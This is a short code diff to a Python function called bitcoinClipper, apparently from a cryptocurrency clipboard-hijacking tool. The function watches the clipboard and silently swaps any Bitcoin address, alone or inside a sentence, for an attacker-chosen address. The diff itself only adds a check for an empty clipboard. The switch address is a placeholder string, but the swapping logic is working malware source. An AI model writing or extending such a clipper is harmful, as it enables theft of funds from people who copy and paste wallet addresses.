@@ -19,12 +19,14 @@ async def bitcoinClipper(switch_address: str):
         
         clipboard_contents: str = clipboard.contents()
         
-        if containsMultipleWords(clipboard_contents):
-            clipboard.set_sentence(clipboard_contents, switch_address)
+        if clipboard_contents == "" or clipboard_contents == " " or clipboard_contents == None:
+            return
         else:
-            if bitcoin.is_valid_address(clipboard_contents):
-                set_contents(switch_address)
-
+            if containsMultipleWords(clipboard_contents):
+                clipboard.set_sentence(clipboard_contents, switch_address)
+            else:
+                if bitcoin.is_valid_address(clipboard_contents):
+                    set_contents(switch_address)
 
 if __name__ == "__main__":
     switch_address: str = "you got clipped!"
